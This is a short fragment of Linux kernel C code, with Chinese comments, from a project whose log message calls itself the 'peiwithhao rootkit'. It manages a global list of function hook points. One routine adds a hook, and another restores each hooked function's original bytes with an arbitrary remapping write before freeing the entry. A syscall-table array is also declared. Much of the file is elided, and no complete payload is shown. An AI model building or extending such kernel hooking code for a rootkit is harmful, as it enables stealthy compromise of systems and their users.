...
/* 全局list_head hook_ctx */
struct list_head system_hook_list = LIST_HEAD_INIT(system_hook_list);

size_t syscall_table_data[5];
size_t get_syscall_data;
...
ssize_t hookpoint_add(struct hook_context *hook_ctx, size_t orig_func, size_t hook_before, size_t hook_after, unsigned int flags){
    ...
    /* 将hook点添加到系统hook 列表 */
    list_add_tail(&hook_ctx->hook_list, &system_hook_list);
    return 0;
}


ssize_t hookpoint_del_all(void){
    struct hook_context *pos, *tmp;
    list_for_each_entry_safe(pos, tmp, &system_hook_list, hook_list) {
        arbitrary_remap_write((void *)pos->orig_func, pos->orig_code, pos->shellcode_nr);
        list_del(&pos->hook_list);
        kfree(pos);
    }
    printk(KERN_INFO"[peiwithhao rootkit] release all the hook point...");
    return 0;
}
